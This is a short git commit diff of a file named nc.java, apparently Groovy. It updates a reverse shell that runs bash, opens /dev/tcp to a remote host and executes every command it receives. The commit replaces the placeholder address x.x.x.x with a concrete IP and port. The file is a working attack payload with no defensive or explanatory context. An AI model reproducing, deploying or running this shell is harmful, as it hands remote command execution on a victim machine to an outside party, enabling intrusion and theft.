4b35ced33d2e56f4fcc3d05c2f031ac88c0b2df7
Sincan2 <hadi@the-netwerk.com>
2023-09-26 10:48:46 +0700

    Update nc.java

--- nc.java
+++ nc.java
@@ -1,3 +1,3 @@
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/119.110.79.118/2023;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
